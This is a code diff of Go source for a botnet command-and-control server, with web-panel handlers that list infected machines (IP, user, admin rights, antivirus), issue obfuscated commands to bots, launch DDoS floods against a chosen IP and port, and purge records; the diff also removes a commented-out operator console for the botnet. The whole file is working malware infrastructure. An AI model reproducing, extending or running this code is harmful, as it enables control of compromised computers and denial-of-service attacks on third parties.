@@ -294,7 +294,7 @@ func profileFilesHandler(response http.ResponseWriter, request *http.Request) { 
 		if userName != "" {
 			url := request.URL.Path
 
-			var newurl = strings.Replace(url, "files", "", -1)
+			var newurl = strings.Replace(url, "/files", "", -1)
 
 			var fixhtml2 string
 
@@ -340,7 +340,7 @@ func profileFilesHandler(response http.ResponseWriter, request *http.Request) { 
 						}
 						output += "<a href=\"" + path.Join(url, element.Name()) + "\">" + element.Name() + "</a>"
 					}
-					var fixhtml = strings.Replace(filebrowseHTML, "{STATS}", createcountDiv(), -1)
+					var fixhtml = strings.Replace(string(filebrowseHTML), "{STATS}", createcountDiv(), -1)
 					var fixhtml1 = strings.Replace(fixhtml, "{FILES}", output, -1)
 					if useSSL {
 						fixhtml2 = strings.Replace(fixhtml1, "{HOST}", "https://"+request.Host, -1)
@@ -389,7 +389,7 @@ func profileFilesHandler(response http.ResponseWriter, request *http.Request) { 
 				}
 			}
 		} else {
-			fmt.Fprintf(response, loginHTML)
+			fmt.Fprintf(response, string(loginHTML))
 		}
 	}
 }
@@ -524,7 +524,7 @@ func infoHandler(response http.ResponseWriter, request *http.Request) {
 			if err == sql.ErrNoRows {
 				//Does not exist?
 				r := strings.NewReplacer("{STATS}", createcountDiv(), "{ERROR}", "No entry by GUID found")
-				result := r.Replace(errorHTML)
+				result := r.Replace(string(errorHTML))
 				fmt.Fprintf(response, result)
 			} else {
 				//Found, lets get the info we need....
@@ -542,18 +542,18 @@ func infoHandler(response http.ResponseWriter, request *http.Request) {
 				err := db.QueryRow("SELECT ip, whoami, os, installdate, isadmin, antivirus, cpuinfo, gpuinfo, clientversion, lastcheckin FROM clients WHERE guid=$1", GUID).Scan(&tmpip, &tmpwhoami, &tmpos, &tmpinstall, &tmpisadmin, &tmpav, &tmpcpu, &tmpgpu, &tmpver, &tmplastcheck)
 				if err != nil {
 					r := strings.NewReplacer("{STATS}", createcountDiv(), "{ERROR}", "Database Error")
-					result := r.Replace(errorHTML)
+					result := r.Replace(string(errorHTML))
 					fmt.Fprintf(response, result)
 				}
 
 				r := strings.NewReplacer("{STATS}", createcountDiv(), "{GUID}", GUID, "{IP}", tmpip, "{WHOAMI}", tmpwhoami, "{OS}", tmpos, "{ADMIN}", tmpisadmin, "{AV}", tmpav, "{LASDATE}", tmplastcheck, "{INSDATE}", tmpinstall, "{CPU}", tmpcpu, "{GPU}", tmpgpu, "{VERSION}", tmpver)
-				result := r.Replace(infoHTML)
+				result := r.Replace(string(infoHTML))
 
 				rr := strings.NewReader(result)
 				io.Copy(response, rr) //dirty, to lazy to fix the damn error so this will work fine.
 			}
 		} else {
-			fmt.Fprintf(response, loginHTML)
+			fmt.Fprintf(response, string(loginHTML))
 		}
 	}
 }
@@ -573,7 +573,7 @@ func panelHandler(response http.ResponseWriter, request *http.Request) {
 				offsetint, _ := strconv.Atoi(OFFSET)
 				if top == 0 {
 					r := strings.NewReplacer("{STATS}", createcountDiv(), "{ERROR}", "No Bots in Database")
-					result := r.Replace(errorHTML)
+					result := r.Replace(string(errorHTML))
 					fmt.Fprintf(response, result)
 				} else {
 					var tableRaw string
@@ -583,7 +583,7 @@ func panelHandler(response http.ResponseWriter, request *http.Request) {
 					//fmt.Println("Query: ", err.Error)
 					if err != nil && err != sql.ErrNoRows {
 						r := strings.NewReplacer("{STATS}", createcountDiv(), "{ERROR}", "Database Error")
-						result := r.Replace(errorHTML)
+						result := r.Replace(string(errorHTML))
 						fmt.Fprintf(response, result)
 					}
 
@@ -592,12 +592,12 @@ func panelHandler(response http.ResponseWriter, request *http.Request) {
 
 						if err != nil {
 							r := strings.NewReplacer("{STATS}", createcountDiv(), "{ERROR}", "Database Error")
-							result := r.Replace(errorHTML)
+							result := r.Replace(string(errorHTML))
 							fmt.Fprintf(response, result)
 						}
 
 						var tmptableRaw string
-						tmptableRaw = botTableHTML
+						tmptableRaw = string(botTableHTML)
 						r := strings.NewReplacer("{GUID}", tmpguid, "{IP}", tmpip, "{WHOAMI}", tmpwhoami, "{OS}", tmpos, "{ADMIN}", tmpadmin, "{LASDATE}", tmplastcheck)
 						result := r.Replace(tmptableRaw)
 						tableRaw += result
@@ -613,14 +613,14 @@ func panelHandler(response http.ResponseWriter, request *http.Request) {
 					s1 := strconv.Itoa(offsetint + 1)
 
 					r := strings.NewReplacer("{STATS}", createcountDiv(), "{RAWTABLE}", tableRaw, "{BACK}", s, "{NEXT}", s1)
-					result := r.Replace(panelHTML)
+					result := r.Replace(string(panelHTML))
 
 					rr := strings.NewReader(result)
 
 					io.Copy(response, rr) //still dirty
 				}
 			} else {
-				fmt.Fprintf(response, loginHTML)
+				fmt.Fprintf(response, string(loginHTML))
 			}
 		} else {
 			fmt.Fprintf(response, "404 page not found")
@@ -640,7 +640,7 @@ func sendCMDHandler(response http.ResponseWriter, request *http.Request) {
 			arguments := request.FormValue("arg1")             //Args for the command
 			if botSelection == "" || commandType == "" || arguments == "" {
 				r := strings.NewReplacer("{STATS}", createcountDiv(), "{ERROR}", "Somethings not right...")
-				result := r.Replace(errorHTML)
+				result := r.Replace(string(errorHTML))
 				fmt.Fprintf(response, result)
 			} else {
 				var tmpguidlist string
@@ -656,16 +656,16 @@ func sendCMDHandler(response http.ResponseWriter, request *http.Request) {
 				done := setCommand(obfuscate(base64Encode(tmpstring)))
 				if done {
 					r := strings.NewReplacer("{STATS}", createcountDiv(), "{MESSAGE}", "Command Issued!")
-					result := r.Replace(successHTML)
+					result := r.Replace(string(successHTML))
 					fmt.Fprintf(response, result)
 				} else {
 					r := strings.NewReplacer("{STATS}", createcountDiv(), "{ERROR}", "Issuing Command")
-					result := r.Replace(errorHTML)
+					result := r.Replace(string(errorHTML))
 					fmt.Fprintf(response, result)
 				}
 			}
 		} else {
-			fmt.Fprintf(response, loginHTML)
+			fmt.Fprintf(response, string(loginHTML))
 		}
 	}
 }
@@ -683,23 +683,23 @@ func ddosCMDHandler(response http.ResponseWriter, request *http.Request) {
 			fmt.Println(ddosmode, ip, port, threads, interval)
 			if ddosmode == "" || ip == "" || port == "" || threads == "" || interval == "" {
 				r := strings.NewReplacer("{STATS}", createcountDiv(), "{ERROR}", "Somethings not right...")
-				result := r.Replace(errorHTML)
+				result := r.Replace(string(errorHTML))
 				fmt.Fprintf(response, result)
 			} else {
 				tmpstring := "000|0x3|" + ddosmode + "|" + ip + ":" + port + "|" + threads + "|" + interval
 				done := setCommand(obfuscate(base64Encode(tmpstring)))
 				if done {
 					r := strings.NewReplacer("{STATS}", createcountDiv(), "{MESSAGE}", "Command Issued!")
-					result := r.Replace(successHTML)
+					result := r.Replace(string(successHTML))
 					fmt.Fprintf(response, result)
 				} else {
 					r := strings.NewReplacer("{STATS}", createcountDiv(), "{ERROR}", "Issuing Command")
-					result := r.Replace(errorHTML)
+					result := r.Replace(string(errorHTML))
 					fmt.Fprintf(response, result)
 				}
 			}
 		} else {
-			fmt.Fprintf(response, loginHTML)
+			fmt.Fprintf(response, string(loginHTML))
 		}
 	}
 }
@@ -711,15 +711,15 @@ func stopDDOSHandler(response http.ResponseWriter, request *http.Request) {
 		done := setCommand(obfuscate(base64Encode(tmpstring)))
 		if done {
 			r := strings.NewReplacer("{STATS}", createcountDiv(), "{MESSAGE}", "Command Issued!")
-			result := r.Replace(successHTML)
+			result := r.Replace(string(successHTML))
 			fmt.Fprintf(response, result)
 		} else {
 			r := strings.NewReplacer("{STATS}", createcountDiv(), "{ERROR}", "Issuing Command")
-			result := r.Replace(errorHTML)
+			result := r.Replace(string(errorHTML))
 			fmt.Fprintf(response, result)
 		}
 	} else {
-		fmt.Fprintf(response, loginHTML)
+		fmt.Fprintf(response, string(loginHTML))
 	}
 }
 
@@ -730,15 +730,15 @@ func refreshHandler(response http.ResponseWriter, request *http.Request) {
 		done := setCommand(obfuscate(base64Encode(tmpstring)))
 		if done {
 			r := strings.NewReplacer("{STATS}", createcountDiv(), "{MESSAGE}", "Command Issued!")
-			result := r.Replace(successHTML)
+			result := r.Replace(string(successHTML))
 			fmt.Fprintf(response, result)
 		} else {
 			r := strings.NewReplacer("{STATS}", createcountDiv(), "{ERROR}", "Issuing Command")
-			result := r.Replace(errorHTML)
+			result := r.Replace(string(errorHTML))
 			fmt.Fprintf(response, result)
 		}
 	} else {
-		fmt.Fprintf(response, loginHTML)
+		fmt.Fprintf(response, string(loginHTML))
 	}
 }
 
@@ -761,23 +761,23 @@ func purgeHandler(response http.ResponseWriter, request *http.Request) {
 		if err == sql.ErrNoRows {
 			//Does not exist?
 			r := strings.NewReplacer("{STATS}", createcountDiv(), "{ERROR}", "No entry by GUID found")
-			result := r.Replace(errorHTML)
+			result := r.Replace(string(errorHTML))
 			fmt.Fprintf(response, result)
 		} else {
 			err1 := db.QueryRow("DELETE FROM clients WHERE guid=$1", GUID)
 			if err1 != nil {
 				r := strings.NewReplacer("{STATS}", createcountDiv(), "{ERROR}", "Database Error")
-				result := r.Replace(errorHTML)
+				result := r.Replace(string(errorHTML))
 				fmt.Fprintf(response, result)
 			} else {
 				//Files will be kept
 				r := strings.NewReplacer("{STATS}", createcountDiv(), "{MESSAGE}", "Client Purged from Database!")
-				result := r.Replace(successHTML)
+				result := r.Replace(string(successHTML))
 				fmt.Fprintf(response, result)
 			}
 		}
 	} else {
-		fmt.Fprintf(response, loginHTML)
+		fmt.Fprintf(response, string(loginHTML))
 	}
 }
 
@@ -866,9 +866,9 @@ func main() {
 			}
 		}
 
-		_ = createDir("./Profiles", 777)
-		_ = createDir("./Builds", 777)
-		_ = createFile("./logs.txt")
+		createDir("./Profiles", 777)
+		createDir("./Builds", 777)
+		createFile("./logs.txt")
 
 		fmt.Println(banner)
 		fmt.Println(" ")
@@ -878,224 +878,12 @@ func main() {
 		fmt.Println("Last Login: " + getLastLogin(false))
 		fmt.Println("====================")
 
-		_ = getLastLogin(true)
+		getLastLogin(true)
 
 		fmt.Println(" ")
 
 		logUpdate(ControlUser + " has logged in.")
 
-		/* for {
-		Start:
-			fmt.Print("0-> ")
-			scan := bufio.NewScanner(os.Stdin)
-			time.Sleep(time.Second * 2)
-			scan.Scan()
-			switch scan.Text() {
-			case "whoami": //Lists the Address to the C&C server
-				if useSSL {
-					fmt.Println("https://" + myIP + ":" + myPort + "/")
-				} else {
-					fmt.Println("http://" + myIP + ":" + myPort + "/")
-				}
-			case "help": //List Help, Commands and Descriptions
-				fmt.Println(" ")
-				fmt.Println("===== HELP =====")
-				fmt.Println("	help = Shows Help information")
-				//	fmt.Println("	listbots = List all known bots")
-				fmt.Println("	mode = Enable and Disable Server Functions")
-				fmt.Println("	stats = List current BOTNET stats")
-				fmt.Println("	command = Advanced BOTNET command Console")
-				//fmt.Println("	listproxys = List all running R-Proxy Bots")
-				fmt.Println("	whoami = C&C Address for Bots")
-				fmt.Println("	tools = C&C Tools")
-				fmt.Println("	purge = Purge the bot Database")
-				fmt.Println("	panic = Delete and Wipe all C&C Information.")
-				fmt.Println("	exit = Shutdown C&C")
-				fmt.Println("===== HELP =====")
-				fmt.Println(" ")
-			case "purge":
-				fmt.Println(" ")
-				fmt.Println("[!] WARNING: THIS WILL DELETE ALL BOTS AND FILES FROM THE SERVER! [!]")
-				fmt.Println("[!] BOTS WILL ATTEMPT TO RE-REGISTER TO C&C ON NEXT CHECK-IN [!]")
-				fmt.Println(" ")
-				fmt.Println("Are you sure you want to do this?")
-				fmt.Print("Yes/No: ")
-				scan := bufio.NewScanner(os.Stdin)
-				scan.Scan()
-				switch scan.Text() {
-				case "Yes":
-
-				case "yes":
-
-				case "YES":
-
-				default:
-					goto Start
-				}
-			case "panic": //freak the fuck out and panic to death
-				fmt.Println(" ")
-				fmt.Println("[!] WARNING: THIS IS DELETE EVERYTHING RELATED TO THE BOTNET! [!]")
-				fmt.Println("[!] ALL DATA, FILES, AND THE C&C WILL BE DELETED [!]")
-				fmt.Println(" ")
-				fmt.Println("Are you sure you want to do this?")
-				fmt.Print("Yes/No: ")
-				scan := bufio.NewScanner(os.Stdin)
-				scan.Scan()
-				switch scan.Text() {
-				case "Yes":
-
-				case "yes":
-
-				case "YES":
-
-				default:
-					goto Start
-				}
-			case "mode":
-				fmt.Println(" ")
-				fmt.Println("Enable and Disable Server Functions. Type 'exit' to go back to main menu.")
-				fmt.Println(" ")
-				for {
-					fmt.Print("What to Enable/Disable: ")
-					scan := bufio.NewScanner(os.Stdin)
-					scan.Scan()
-					switch scan.Text() {
-					case "all":
-						if isEnabled {
-							isEnabled = false
-							fmt.Println("All Functions Disabled")
-							fmt.Println("[!]Warning Bots will not be able to register with the C&C! [!]")
-							fmt.Println("[!]Warning Bots will not be able to check for commands with the C&C! [!]")
-							fmt.Println("[!]Warning Bots will not be able to upload to the C&C! [!]")
-						} else {
-							isEnabled = true
-							fmt.Println("All Functions Enabled")
-						}
-					case "panel":
-						if isPanel {
-							isPanel = false
-							fmt.Println("HTML Panel Disabled")
-						} else {
-							isPanel = true
-							fmt.Println("HTML Panel Enabled")
-							if useSSL {
-								fmt.Println("Login in at " + "https://" + myIP + ":" + myPort + "/panel to view the Panel.")
-							} else {
-								fmt.Println("Login in at " + "http://" + myIP + ":" + myPort + "/panel to view the Panel.")
-							}
-						}
-					case "new":
-						if isNew {
-							isNew = false
-							fmt.Println("New Bot Registration Disabled")
-							fmt.Println("[!]Warning Bots will not be able to register with the C&C! [!]")
-						} else {
-							isNew = true
-							fmt.Println("New Bot Registration Enabled")
-						}
-					case "help":
-						fmt.Println(" ")
-						fmt.Println("===== HELP =====")
-						fmt.Println("	all = All C&C Functions")
-						fmt.Println("	panel = Visual C&C; HTML Panel")
-						fmt.Println("	new = Add new bots to the database.")
-						fmt.Println("===== HELP =====")
-						fmt.Println(" ")
-					case "exit":
-						goto Start
-					case "exit-force":
-						os.Exit(0)
-					default:
-						fmt.Println("[!] Unknown Command! Type 'help' for a list of commands. [!]")
-					}
-				}
-			case "stats": //List Botnet Stats, Bots in DB, Files in DB, Last Check-in, Ect...
-				s := strconv.Itoa(count())
-				s1 := strconv.Itoa(countAdmin())
-				s2 := strconv.Itoa(countFiles())
-				fmt.Println("[" + s + "] Total Bots in Database")
-				fmt.Println("[" + s1 + "] Total Bots with Admin Rights in Database")
-				fmt.Println("[" + s2 + "] Total Files in the Database")
-			case "listbots": //List bots, With filters (Country, Admin, Runing server, Ect...)
-
-			case "command": //Add command to DB, Replaces old command.
-				//Show old command, Ask for new based on GUID 000 = ALL bots, some type of filter system...
-				t1, t2 := commandIssue()
-				fmt.Println(" ")
-				fmt.Println("This is for Advanced Users! Type 'exit' to leave.")
-				fmt.Println("For the normal Visual C&C, activate the panel")
-				fmt.Println("Example Command: { 000|0x1|www.google.com|1 } will force all bots to open Google.com")
-				fmt.Println("====================")
-				fmt.Println("Current Command: " + t1)
-				fmt.Println("Current Command Issued: " + t2)
-				fmt.Println("====================")
-				fmt.Println(" ")
-				for {
-					fmt.Print("Command: ")
-					scan := bufio.NewScanner(os.Stdin)
-					scan.Scan()
-					switch scan.Text() {
-					case "exit":
-						goto Start
-					case "exit-force":
-						os.Exit(0)
-					default:
-						//Handle Command
-						if strings.Contains(scan.Text(), "|") {
-							done := setCommand(obfuscate(base64Encode(scan.Text())))
-							if done {
-								fmt.Println("Command SET!")
-							} else {
-								fmt.Println("[!] THERE WAS AN ERROR, CHECK DATABASE AND SETTINGS! [!]")
-							}
-						} else {
-							fmt.Println("[!] POSSABLE INVALID COMMAND SYNTAX [!]")
-						}
-					}
-				}
-			case "tools": //List C&C Tools
-				fmt.Println(" ")
-				fmt.Println("Tools")
-				fmt.Println("md5 = MD5 HASH of Text.")
-				fmt.Println("obfuscate = Obfuscate Text.")
-				fmt.Println("deobfuscate = Deobfuscate Text.")
-				fmt.Println(" ")
-				for {
-					fmt.Print("Tool: ")
-					scan := bufio.NewScanner(os.Stdin)
-					scan.Scan()
-					switch scan.Text() {
-					case "md5":
-						fmt.Print("Text: ")
-						scan := bufio.NewScanner(os.Stdin)
-						scan.Scan()
-						fmt.Println("HASH: " + md5Hash(scan.Text()))
-					case "obfuscate":
-						fmt.Print("Text: ")
-						scan := bufio.NewScanner(os.Stdin)
-						scan.Scan()
-						fmt.Println("OBFUSCATED: " + obfuscate(scan.Text()))
-					case "deobfuscate":
-						fmt.Print("Text: ")
-						scan := bufio.NewScanner(os.Stdin)
-						scan.Scan()
-						fmt.Println("DEOBFUSCATED: " + deobfuscate(scan.Text()))
-					case "exit":
-						goto Start
-					case "exit-force":
-						os.Exit(0)
-					default:
-						fmt.Println("[!] Unknown Tool! [!]")
-					}
-				}
-			case "listproxys": //List all the aviviable proxys from bots
-			//Show count, have filters by country... maybe ping?
-			case "exit": //Kills C&C Server
-				os.Exit(0)
-			default:
-				fmt.Println("[!] Unknown Command! Type 'help' for a list of commands. [!]")
-			}
-		} */
 		backend()
 	} else {
 		os.Exit(0)
